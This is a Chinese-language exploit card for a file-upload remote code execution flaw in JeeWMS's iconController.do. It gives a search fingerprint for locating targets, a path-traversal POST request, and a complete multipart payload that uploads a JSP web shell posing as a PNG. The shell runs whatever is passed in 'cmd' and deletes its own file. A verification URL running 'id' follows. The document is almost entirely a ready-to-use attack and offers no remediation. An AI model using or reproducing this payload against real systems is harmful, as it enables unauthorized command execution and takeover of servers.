# JeeWMSiconController.do文件上传致RCE漏洞

- **系统**：JeeWMSiconController　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="url:userController.do?userOrgSelect&userId="`
- **请求**：`POST /rest/../iconController.do?saveOrUpdateIcon HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHRhkXyQj…`

**请求体 / payload**
```
------WebKitFormBoundaryHRhkXyQjTSAk8j8c
Content-Disposition: form-data; name="name"; filename="t.jsp"
Content-Type: image/png
<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("
");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("
");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryHRhkXyQjTSAk8j8c--
验证url
/plug-in/accordion/images/t.jsp?cmd=id
```
- **预期**：200　|　—